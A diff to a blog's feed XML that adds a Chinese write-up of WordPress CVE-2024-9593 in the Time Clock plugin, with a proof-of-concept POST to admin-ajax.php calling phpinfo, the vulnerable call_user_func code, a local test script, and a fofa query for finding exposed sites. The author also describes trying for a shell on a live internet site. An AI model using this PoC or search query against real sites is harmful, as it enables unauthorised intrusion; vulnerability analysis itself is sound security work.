@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>窥探wordpress CVE-2024-9593所谓代码执行漏洞的秘密</title>
+      <link href="/penetrationtest/2024/11/articles/34f1892bb33c988c/"/>
+      <url>/penetrationtest/2024/11/articles/34f1892bb33c988c/</url>
+      
+        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在浏览某些网站的网站的时候发现WordPress存在代码执行漏洞。即为CVE-2024-9593 在github搜索中发现如下poc链接:<br><a href="https://github.com/RandomRobbieBF/CVE-2024-9593">https://github.com/RandomRobbieBF/CVE-2024-9593</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041557581.jpg" alt="poc"></p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>wp<span class="token operator">-</span>admin<span class="token operator">/</span>admin<span class="token operator">-</span>ajax<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>etimeclockwp_load_function HTTP<span class="token operator">/</span><span class="token number">2</span><span class="token class-name">Host</span><span class="token operator">:</span> wpscan<span class="token operator">-</span>vulnerability<span class="token operator">-</span>test<span class="token operator">-</span>bench<span class="token punctuation">.</span>ddev<span class="token punctuation">.</span>site<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">58.0</span><span class="token number">.3029</span><span class="token number">.110</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.3</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Length</span><span class="token operator">:</span> <span class="token number">16</span>function<span class="token operator">=</span>phpinfo</code></pre><p>于是乎找一波网站实战网站是找到了但是getshell想了很多没有成果。那我们接下来研究一下漏洞原理这个到底是什么引发的这个漏洞。看看能不能从中得到启发。<br>互联网找到的实战站点。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041602042.png" alt="互联网网站"></p><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>我们在cve网站上面搜索一下编码<a href="https://www.cve.org/CVERecord?id=CVE-2024-9593">https://www.cve.org/CVERecord?id=CVE-2024-9593</a>  发现漏洞等级为8.3 级然后发现如下引用：</p><pre class="language-java" data-language="java"><code class="language-java">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>wordfence<span class="token punctuation">.</span>com<span class="token operator">/</span>threat<span class="token operator">-</span>intel<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">247e599</span>a<span class="token operator">-</span><span class="token number">74e2</span><span class="token operator">-</span><span class="token number">41d</span><span class="token number">5</span><span class="token operator">-</span>a1ba<span class="token operator">-</span><span class="token number">978</span>a807e6544<span class="token operator">?</span>source<span class="token operator">=</span>cve https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>plugins<span class="token punctuation">.</span>trac<span class="token punctuation">.</span>wordpress<span class="token punctuation">.</span>org<span class="token operator">/</span>browser<span class="token operator">/</span>time<span class="token operator">-</span>clock<span class="token operator">/</span>tags<span class="token operator">/</span><span class="token number">1.2</span><span class="token number">.2</span><span class="token operator">/</span>includes<span class="token operator">/</span>admin<span class="token operator">/</span>ajax_functions_admin<span class="token punctuation">.</span>php#L58 https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>plugins<span class="token punctuation">.</span>trac<span class="token punctuation">.</span>wordpress<span class="token punctuation">.</span>org<span class="token operator">/</span>changeset<span class="token operator">/</span><span class="token number">3171046</span><span class="token operator">/</span>time<span class="token operator">-</span>clock#file40 </code></pre><p>我们发现time-clock 的1.2.2版本的58行存在漏洞截图如下:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041611473.jpg" alt="漏洞代码"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// load function</span><span class="token keyword">function</span> <span class="token function-definition function">etimeclockwp_load_function_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token function">sanitize_text_field</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//对传入参数进行过滤除了字母数字以外过滤</span><span class="token comment">// only run function is it exists</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">wp_die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">add_action</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_ajax_etimeclockwp_load_function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'etimeclockwp_load_function_callback'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add_action</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_ajax_nopriv_etimeclockwp_load_function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'etimeclockwp_load_function_callback'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>核心代码就是如果这个函数名称存在那么使用call_user_func 调用这个函数。所以漏洞就知道了这个漏洞可以调用wordpress里面写的所有函数。我们看没有传参数的地方所以。这个漏洞必须配合wordpres 里面的某些函数才能利用成功。我们在本地搭建一个环境看看。假如本地有个testok函数代码如下:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">// only run function is it exists</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"no function!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">testok</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//那么我们就可以调用这个函数并且传入参数进行利用</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041620169.jpg" alt="测试代码"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上所述改漏洞需要配合wp其他函数方可利用。并不能直接利用。直接可用可以打的phpinfo。fofa:”wp-content&#x2F;plugins&#x2F;time-clock&#x2F;“<br>另外资产也不多。工具集成一下当poc用吧。。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041622267.jpg" alt="fofa"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> PenetrationTest </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PenetrationTestingExample </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>webframeworktools dll模式简单批量使用</title>
       <link href="/securitytools/2024/10/articles/039303a532fb37a7/"/>
       <url>/securitytools/2024/10/articles/039303a532fb37a7/</url>
@@ -584,9 +609,9 @@
       
         <tags>
             
-            <tag> PenetrationTest </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> PenetrationTest </tag>
             
             <tag> Brida </tag>
             
@@ -690,9 +715,9 @@
       
         <tags>
             
-            <tag> PenetrationTest </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> PenetrationTest </tag>
             
             <tag> autoDecoder </tag>
             
@@ -719,9 +744,9 @@
       
         <tags>
             
-            <tag> PenetrationTest </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> PenetrationTest </tag>
             
             <tag> autoDecoder </tag>
             
@@ -748,9 +773,9 @@
       
         <tags>
             
-            <tag> PenetrationTest </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> PenetrationTest </tag>
             
             <tag> Brida </tag>
             
@@ -804,9 +829,9 @@
       
         <tags>
             
-            <tag> PenetrationTest </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> PenetrationTest </tag>
             
         </tags>
       
